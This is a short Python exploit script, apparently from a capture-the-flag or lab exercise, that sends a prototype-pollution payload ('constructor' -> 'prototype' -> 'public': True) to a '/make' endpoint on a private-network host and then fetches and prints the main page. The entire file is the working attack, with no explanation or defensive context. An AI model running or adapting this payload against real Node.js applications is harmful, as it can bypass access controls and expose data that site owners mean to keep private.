import requests

url = "http://192.168.65.132"

data_1 = {
    "constructor": {
        "prototype": {
            "public": True
        }
    }
}

session = requests.session()

r = session.post(url = url + "/make", json = data_1)
r = session.get(url = url)
print(r.text)